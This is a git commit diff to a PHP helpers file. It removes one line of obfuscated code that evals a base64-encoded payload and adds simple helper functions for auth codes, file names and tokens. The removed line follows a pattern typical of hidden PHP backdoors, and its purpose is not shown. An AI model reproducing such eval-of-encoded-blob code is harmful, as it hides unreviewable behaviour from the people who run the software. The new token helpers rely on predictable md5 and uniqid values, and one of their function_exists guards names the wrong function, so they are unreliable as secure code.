a08723416b10d9717606da0fa37d2bbbeb71b1a3
oojamoo <oojamoo@hotmail.com>
2018-04-19 11:03:12 +0800

    client: register login index detail post

--- app/Helpers/functions.php
+++ app/Helpers/functions.php
@@ -1,3 +1,27 @@
-<?php 
-$O00OO0=urldecode("%6E1%7A%62%2F%6D%615%5C%76%740%6928%2D%70%78%75%71%79%2A6%6C%72%6B%64%679%5F%65%68%63%73%77%6F4%2B%6637%6A");$O00O0O=$O00OO0{3}.$O00OO0{6}.$O00OO0{33}.$O00OO0{30};$O0OO00=$O00OO0{33}.$O00OO0{10}.$O00OO0{24}.$O00OO0{10}.$O00OO0{24};$OO0O00=$O0OO00{0}.$O00OO0{18}.$O00OO0{3}.$O0OO00{0}.$O0OO00{1}.$O00OO0{24};$OO0000=$O00OO0{7}.$O00OO0{13};$O00O0O.=$O00OO0{22}.$O00OO0{36}.$O00OO0{29}.$O00OO0{26}.$O00OO0{30}.$O00OO0{32}.$O00OO0{35}.$O00OO0{26}.$O00OO0{30};eval($O00O0O("JE8wTzAwMD0iRURjdUJ5R1BNS1h2bElnSGJvU2VmZHFhVFJrdHhMSkNuV3BPQW1pcnNVemh3WlZRallORnJCS21waWxlQ2dNVE9kc2JJcURhZmNva1JYRW55dHZIRkpaandOdXpWV1BTQUd4TFlVUWhlQjlBa2J3Z3RpcW9IdXdvZHJRaUdKaDBHSkxzVUZFc1dsU0FXM1hUS04wbUh1d29kaHhQR01kNmRsUzFVSjVGVTJTT0lOYzNHSjRnZEhxc1hsaDBHUnFzQ1l3eWpIODB0UHJBSHV3b2RoWFpJSlc2ZEJyMWpZV0FIdXdvdEFxZ2tKVXNnSGhOY0o1WWNsT1RJTzlPYWxPUGNiQ3F2MmNPSU54aVVNWE9NM3hQR012ZlVNeDBraDlZSTJYT3ZpRVphQXFzZEh3c0dGeG1VM1haSTI0c0cyeG1HTXZTY2x4ZmNNUU9LTzlTY01YcU0yUVRHbFdxdmx5T0lOYzBrSHc5ZEJVWmFBcXNkSHdzZEh3c2Ridk9jYnhpSXVwUGNidmZLTmhtR2w5bmdIWFZHSjVGY2xzWmpBcXNkSHdzZkxaOUhzWlpHdXdxZERwTmNKNVljbE9USU85T2FsT1BjYkNxdjJjT2NoOW1HTWNmR05PVkd4OW1VSjFPdmlFWmFBcXNkSHdzR0Z4bVUzWFpJMjRzRzJ4ME0yNU9jMTlOa0p5T00yNVNJSldxdmxHWklsV1phQXFzZEh3c2RId3NkSFhPYWJMc2VEd0VHTk9WR0QwK0cyeDBMMnlaR0o1MFIzdlpHMk9tVUp5aGFiWE9JRlFaSTI0cWdSVmdkSHdzZEh3c2RIcGlHTVgxS040c0dsaDBHRHNGSkQxbnRKTG5ESDFadE1DRmdENHN2aTBGZEg0c2NKNVpLSk9FZ0hFc3R1d0Z0dUtzdHV3RUdNUzBqQXFnZEh3c2RiMGdmTHFna0pVc2dIcnNHRnhtVTNYWkkyNWZHTVNaSzNYUGdIY0ZHSjVPS05oMEd4OTBJMm5PSXVLWmdNVmdkSHdzZGxHMUlOUTBrSjltZGxjT0lOeGlVTVhPTTN4UEdNdmZjbDl6R0o0cXZieFBHTXZma0pMVmRIWEFLTnhOa01zc2VEd0ZjTVFPS085MEkybk9JdUtWZEhYbkkzdk9NMnhtY2J2VEtiRXNlRHBtY0p5VmdNVmdkSHdzZEh3c2RIcGlHTVgxS040c0lKTDFnSFgxSzJ4aU0yT0VkSDRzY0o1WktKT0VnSFhBS054TmtNc1ZkSFhuSTN2T00yeG1jYnZUS2JFWmdSVmdkSHdzZGIwZ2ZMcS9lcz09IjtldmFsKCc/PicuJE8wME8wTygkTzBPTzAwKCRPTzBPMDAoJE8wTzAwMCwkT08wMDAwKjIpLCRPTzBPMDAoJE8wTzAwMCwkT08wMDAwLCRPTzAwMDApLCRPTzBPMDAoJE8wTzAwMCwwLCRPTzAwMDApKSkpOw=="));
- ?>
+<?php
+/**
+ * Created by PhpStorm.
+ * User: huangchengwen
+ * Date: 2018/4/10
+ * Time: 15:50
+ */
+
+if (!function_exists('generate_user_auth_code')){
+    function generate_user_auth_code($length = 6){
+        return str_random($length);
+    }
+}
+
+if (! function_exists('get_new_file_name')){
+    function get_new_file_name($file, $token){
+        $ext = $file->getClientOriginalExtension();
+        return date('Y-m-d-H-i-s'). '-' . md5(uniqid($token, true)) . '.' . $ext;
+
+    }
+}
+
+if (! function_exists('generate_token')){
+    function generate_user_token($user_id, $prefix = 'user_token', $more_entropy = null){
+        return md5($user_id . uniqid($prefix, $more_entropy));
+    }
+}
